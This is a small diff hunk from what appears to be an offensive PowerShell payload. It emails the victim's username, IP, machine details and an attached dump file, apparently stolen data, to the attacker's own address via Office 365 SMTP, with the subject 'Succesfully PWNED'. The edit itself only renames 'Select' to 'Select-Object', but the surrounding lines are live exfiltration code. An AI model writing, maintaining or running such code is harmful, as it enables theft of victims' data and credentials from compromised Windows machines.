@@ -10,7 +10,7 @@ $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = $UserName
 $ReportEmail.To.Add($UserName)
 $ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
-$ReportEmail.Body = $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
+$ReportEmail.Body = $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Model,Manufacturer
 $ReportEmail.Attachments.Add("$dump_file_name")
 
 $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.office365.com', 587)
